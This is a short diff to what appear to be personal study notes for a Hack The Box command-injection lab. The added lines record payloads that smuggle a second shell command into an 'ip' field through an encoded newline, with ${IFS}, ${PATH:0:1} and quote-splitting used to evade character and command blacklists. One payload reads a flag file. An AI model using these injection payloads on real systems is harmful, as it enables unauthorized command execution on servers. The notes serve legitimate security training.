@@ -93,9 +93,15 @@ GabrielQK@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
 \
 ```
 
+#### ByPassing Other Blacklisted Char solution
+```bash
+ip=127.0.0.1%0als${IFS}${PATH:0:1}home
+```
 
-
-
+#### Bypassing Blacklisted Commands
+```bash
+ip=127.0.0.0%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+```
 ## Questions/Thoughts
 
 
